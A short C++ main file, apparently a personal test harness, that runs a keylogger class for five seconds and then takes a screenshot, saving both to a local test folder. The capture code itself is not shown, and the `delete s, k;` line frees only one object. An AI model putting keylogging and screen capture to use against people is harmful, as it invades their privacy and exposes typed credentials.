#include "KeyLogger.hpp"
#include "ScreenCapture.hpp"
#include <windows.h>
#include <WinUser.h>
#include <thread>
#include <expected>

int main() {
	ShowWindow(GetConsoleWindow(), SW_SHOW);
	KeyLogger* k = new KeyLogger("C:\\Users\\yarin\\Test");
	std::thread thread_log(&KeyLogger::StartKeyLogger, k);
	std::this_thread::sleep_for(std::chrono::milliseconds(5 * 1000));
	k->StopLogging();
	thread_log.join();
	ScreenCapture* s = new ScreenCapture("C:\\Users\\yarin\\Test");
	int i = s->TakeScreenShot();
	delete s, k;
	return i;
}
